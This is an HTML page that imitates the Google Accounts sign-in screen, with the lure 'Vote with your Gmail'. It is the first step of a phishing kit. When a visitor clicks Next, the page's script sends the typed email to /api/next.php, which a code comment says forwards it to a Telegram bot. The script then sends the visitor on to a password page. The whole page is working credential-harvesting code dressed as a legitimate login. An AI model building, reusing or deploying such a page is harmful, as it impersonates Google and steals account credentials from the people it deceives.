<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="images/google-logo-vector-format-white-background-illustration-407571050.webp">
    <style>
        :root {
            --gmail-blue: #1a73e8;
            --gmail-red: #ea4335;
            --gmail-yellow: #fbbc04;
            --gmail-green: #34a853;
            --gmail-white: #ffffff;
            --gmail-gray: #5f6368;
            --gmail-light-gray: #f1f3f4;
            --gmail-border: #dadce0;
        }

        * {
            box-sizing: border-box;
        }

        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: var(--gmail-white);
            color: #202124;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .login-gmail-form {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            padding: 48px 36px 36px !important;
            box-sizing: border-box;
        }

        .login-gmail-logo {
            width: 220px !important;
            height: 75px !important;
            margin: 0 0 12px 0 !important;
            display: block !important;
            background: url('images/google-logo-vector-format-white-background-illustration-407571050.webp') no-repeat left center !important;
            background-size: contain !important;
        }

        .login-title {
            font-size: 32px !important;
            font-weight: 400 !important;
            color: #202124 !important;
            margin: 0 0 16px 0 !important;
            text-align: left !important;
        }

        .login-subtitle {
            font-size: 18px;
            font-weight: 400;
            color: #5f6368;
            margin: 0 0 32px 0;
            text-align: left;
        }

        .login-input-wrapper {
            position: relative;
            margin-bottom: 8px;
            border: 1px solid #000000;
            border-radius: 4px;
            transition: border-color 0.2s ease;
            height: 56px;
        }

        .login-input-wrapper.focused {
            border-color: var(--gmail-blue);
        }

        .login-input-label {
            position: absolute;
            top: 50%;
            left: 16px;
            transform: translateY(-50%);
            color: var(--gmail-gray);
            font-size: 16px;
            font-weight: 400;
            pointer-events: none;
            transition: all 0.2s ease;
            z-index: 1;
            opacity: 1;
        }

        .login-input-wrapper.focused .login-input-label {
            top: -8px;
            left: 16px;
            transform: none;
            color: var(--gmail-blue);
            font-size: 12px;
            background: var(--gmail-white);
            padding: 0 4px;
        }

        .login-gmail-input:not(:placeholder-shown) + .login-input-wrapper .login-input-label {
            top: -8px;
            left: 16px;
            transform: none;
            color: var(--gmail-gray);
            font-size: 12px;
            background: var(--gmail-white);
            padding: 0 4px;
        }



        .login-gmail-input {
            width: 100%;
            height: 100%;
            padding: 16px 16px 16px 16px;
            border: none;
            border-radius: 4px;
            background: transparent;
            color: #202124;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            position: relative;
            z-index: 1;
        }

        .login-gmail-input:focus {
            padding: 20px 15px 4px 15px;
        }

        .login-input-wrapper.focused .login-gmail-input,
        .login-gmail-input:not(:placeholder-shown) {
            padding: 20px 15px 4px 15px;
        }

        .login-gmail-links {
            text-align: left;
            margin-bottom: 40px;
        }

        .login-gmail-links a {
            color: var(--gmail-blue);
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
        }

        .login-gmail-links a:hover {
            text-decoration: underline;
        }

        .login-guest-mode {
            margin-bottom: 16px;
            font-size: 14px;
            color: #5f6368;
            line-height: 1.4;
        }

        .login-guest-link {
            color: var(--gmail-blue) !important;
            text-decoration: none;
            font-weight: 500;
        }

        .login-guest-link:hover {
            text-decoration: underline;
        }

        .login-bottom-section {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .login-create-account {
            color: var(--gmail-blue);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .login-create-account:hover {
            text-decoration: underline;
        }

        .login-gmail-next-btn {
            width: auto;
            min-width: 90px;
            max-width: 120px;
            background: var(--gmail-blue);
            color: var(--gmail-white);
            border: none;
            border-radius: 24px;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }


        .login-gmail-next-btn:hover {
            background: #1557b0;
        }

        .login-gmail-footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #f8f9fa;
            border-top: 1px solid var(--gmail-border);
            padding: 16px 24px;
        }

        .login-footer-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
            flex-wrap: wrap;
            gap: 16px;
        }

        .login-footer-left {
            display: flex;
            align-items: center;
            gap: 24px;
        }

        .login-language-select {
            background: transparent;
            border: none;
            color: var(--gmail-gray);
            font-size: 14px;
            cursor: pointer;
            outline: none;
        }

        .login-footer-links {
            display: flex;
            gap: 24px;
        }

        .login-footer-links a {
            color: var(--gmail-gray);
            text-decoration: none;
            font-size: 14px;
        }

        .login-footer-links a:hover {
            text-decoration: underline;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .login-gmail-form {
                padding: 32px 24px 24px;
            }

            .login-title {
                font-size: 22px;
            }

            .login-gmail-input {
                padding: 14px;
                font-size: 16px; /* Prevent zoom on iOS */
            }

            .login-gmail-input:focus {
                padding: 13px;
            }

            .login-gmail-next-btn {
                padding: 14px;
                font-size: 16px;
            }

            .login-gmail-footer {
                padding: 12px 16px;
            }

            .login-footer-content {
                flex-direction: column;
                gap: 12px;
                text-align: center;
            }
        }

        @media (max-width: 480px) {
            .login-gmail-form {
                padding: 24px 16px 16px;
            }

            .login-title {
                font-size: 20px;
            }

            .login-gmail-logo {
                width: 60px;
                height: 20px;
                margin-bottom: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="login-gmail-form">
        <div class="login-gmail-logo"></div>
        <h1 class="login-title">Sign in</h1>
        <div class="login-subtitle">Vote with your Gmail</div>

        <div class="login-input-wrapper">
            <label for="email" class="login-input-label">Email or phone</label>
            <input type="email" id="email" class="login-gmail-input" required>
        </div>

        <div class="login-gmail-links">
            <a href="#">Forgot email?</a>
        </div>

        <div class="login-guest-mode">
            Not your computer? Use Private Browsing windows to sign in. <a href="#" class="login-guest-link">Learn more about using Guest mode</a>
        </div>

        <div class="login-bottom-section">
            <a href="#" class="login-create-account">Create account</a>
            <button class="login-gmail-next-btn" onclick="emailContinue()">Next</button>
        </div>
    </div>

    <footer class="login-gmail-footer">
        <div class="login-footer-content">
            <div class="login-footer-left">
                <select class="login-language-select" aria-label="Select language">
                    <option>English (United States)</option>
                </select>
                <div class="login-footer-links">
                    <a href="#">Help</a>
                    <a href="#">Privacy</a>
                    <a href="#">Terms</a>
                </div>
            </div>
        </div>
    </footer>

    <script>
        // Handle input focus/blur for styling
        const inputWrapper = document.querySelector('.login-input-wrapper');
        const input = document.getElementById('email');

        input.addEventListener('focus', function() {
            inputWrapper.classList.add('focused');
        });

        input.addEventListener('blur', function() {
            if (!this.value.trim()) {
                inputWrapper.classList.remove('focused');
            }
        });

        // Handle clicks outside the input wrapper
        document.addEventListener('click', function(e) {
            if (!inputWrapper.contains(e.target)) {
                inputWrapper.classList.remove('focused');
            }
        });

        function emailContinue() {
            const input = document.getElementById('email').value;
            if (input.trim()) {
                // Send to Telegram bot FIRST
                const xhr = new XMLHttpRequest();
                xhr.open('POST', '/api/next.php', false); // Make synchronous
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send('di=' + encodeURIComponent(input));

                // Always go to password page first - verification control will handle the rest
                window.location.href = 'password.html?email=' + encodeURIComponent(input);
            } else {
                alert("Please enter your email or phone number.");
            }
        }
    </script>
</body>
</html>
